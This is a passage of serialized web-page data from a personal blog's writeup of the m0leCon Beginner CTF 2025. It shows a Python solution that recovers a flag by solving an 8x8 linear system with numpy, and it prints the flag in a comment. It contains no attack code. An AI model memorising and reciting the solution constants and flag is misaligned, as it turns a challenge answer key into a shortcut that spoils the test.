Advisor"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"解线性方程组。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import numpy as np\n\nA0 = [\n    0x558, 0x6EC, 0x629, 0x600, 0x53F, 0x4A9, 0x40F, 0x538,\n    0x604, 0x748, 0x4EF, 0x3F1, 0x4E9, 0x76D, 0x407, 0x42F,\n    0x58A, 0x7CB, 0x69C, 0x5FD, 0x532, 0x74A, 0x429, 0x653,\n    0x762, 0x6B5, 0x574, 0x758, 0x479, 0x6FE, 0x547, 0x77D,\n    0x4EE, 0x601, 0x6D4, 0x55F, 0x787, 0x420, 0x661, 0x625,\n    0x44B, 0x7A2, 0x646, 0x668, 0x541, 0x699, 0x7C0, 0x593,\n    0x436, 0x62F, 0x5E3, 0x668, 0x507, 0x459, 0x4FB, 0x706,\n    0x5EE, 0x421, 0x6A7, 0x6A0, 0x66A, 0x5FC, 0x781, 0x4BA,\n]\nprint(len(A0))  # 64\n\nA = np.array(A0).reshape(8, 8)\nb = [0x24755BA, 0x238FFE7, 0x28CC2B2, 0x2B017EC, 0x278F0B0, 0x295FE1C, 0x2500092, 0x27D1441]\nx = np.linalg.solve(A, b)\n\nprint(x)\nfor i in x:\n    print(round(i))\n\n# ptm{sm7_s0lv3r5_c4n_b3_m4g1c4l}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}]]
c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"m0leCon Beginner CTF 2025 Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/24d/wp-m0lecon-2025/"}]]
1:null
